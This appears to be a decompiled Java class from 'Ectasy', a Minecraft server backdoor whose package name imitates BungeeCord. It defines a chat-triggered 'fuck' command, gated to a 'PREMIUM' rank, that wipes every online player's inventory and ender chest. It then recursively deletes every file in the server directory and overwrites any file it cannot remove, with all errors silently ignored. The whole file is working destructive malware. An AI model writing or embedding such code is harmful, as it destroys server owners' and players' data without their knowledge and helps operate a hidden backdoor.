package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.FileUtil;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "fuck",
   description = "Fucks the whole server",
   blatant = true,
   rank = Rank.PREMIUM
)
public class FuckCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for(Player var5 : Bukkit.getOnlinePlayers()) {
         Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
            var5.getInventory().clear();
            var5.getEnderChest().clear();
         });
      }

      try {
         Files.walk(Paths.get("")).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(file -> {
            if (!file.delete()) {
               try {
                  FileUtil.flushFile(file);
               } catch (Exception ignored) {
               }
            }
         });
      } catch (Exception ignored) {
      }
   }
}
